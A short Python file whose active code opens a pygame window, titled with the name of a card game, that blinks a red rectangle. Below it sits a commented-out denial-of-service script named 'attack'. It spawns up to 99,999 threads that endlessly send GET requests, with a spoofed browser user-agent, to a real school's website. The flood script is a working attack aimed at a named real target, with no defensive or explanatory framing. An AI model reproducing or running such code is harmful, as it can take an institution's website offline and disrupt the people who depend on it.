import pygame
pygame.init()
pygame.font.init()
clock = pygame.time.Clock()
clock.tick(60)
screen = pygame.display.set_mode((1600,900))
pygame.display.set_caption('歡樂鬥地主')

black = (74,74,74)
red = (219,81,81)
rect1 = pygame.rect.Rect(600,500,300,50)
ans = 0
cursor = False
while True:
    for event in pygame.event.get():
        if event.type == pygame.KEYDOWN and event.key == pygame.K_ESCAPE:
            quit()
    screen.fill(black)
    ans += 1
    if ans == 60:
        cursor = not cursor
        ans = 0
    if cursor == True:
        pygame.draw.rect(screen,red,rect1)
    
    pygame.display.update()







# import threading
# import requests
# adsw = 'https://www.yy2.edu.hk/'
# data = {'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
#         }
# def attack(url,header):
#     while 1:
#         requests.get(url,headers=header)
#         print('1')
# def loop():
#     for i in range(99999):
#         haha = threading.Thread(target=attack,args=(adsw,data))
#         haha.start()
# loop()